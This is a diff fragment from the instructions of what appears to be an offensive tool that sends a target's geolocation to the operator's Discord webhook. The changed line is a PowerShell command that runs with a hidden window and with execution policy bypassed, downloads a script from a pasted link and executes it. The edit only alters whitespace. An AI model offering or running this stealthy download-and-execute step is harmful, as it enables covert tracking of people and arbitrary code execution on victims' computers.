@@ -23,5 +23,5 @@ sends the coordinates of the target to your discord server via webhook
 <p><p/>
 <p>paste that link in the line below where it says paste here <p/>
 <p><p/>
-<p> ```powershell -w h -NoP -NonI -Exec Bypass iwr PASTE HERE | iex``` <p/>
+<p>  ```powershell -w h -NoP -NonI -Exec Bypass iwr PASTE HERE | iex```  <p/>
 <p><p/>
